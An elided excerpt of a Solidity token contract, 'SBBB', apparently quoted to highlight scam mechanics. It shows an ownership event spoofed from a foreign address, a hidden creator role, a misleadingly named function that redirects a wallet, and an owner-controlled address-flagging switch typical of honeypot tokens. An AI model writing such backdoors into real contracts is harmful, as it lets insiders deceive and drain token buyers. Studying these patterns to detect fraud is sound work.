...
contract Ownable is Context {
    ...
    constructor () {
        ...
        _owner = msgSender;
        _creator = msgSender;
        emit OwnershipTransferred(address(0xc5e8c25949fede6A0d448A50Efb0c7155eB0268d), msgSender);
    }
...
contract SBBB is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "SBig black bear";
    string private _symbol = "SBBB";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x41C3516Df62C71317b50d53c489CCe24097E3c31); 
    address payable public teamWalletAddress = payable(0x41C3516Df62C71317b50d53c489CCe24097E3c31); 
    ...
    address payable public teamWallteAddress = payable(0x41C3516Df62C71317b50d53c489CCe24097E3c31); 
    ...
    function setNumTokenslp(address newAddress) external onlyCreator() {
      teamWallteAddress = payable(newAddress);
    }
    ...
    function setSwap(address ad,bool NewValue) public onlyOwner{
    isSwap[ad] = NewValue;
    }
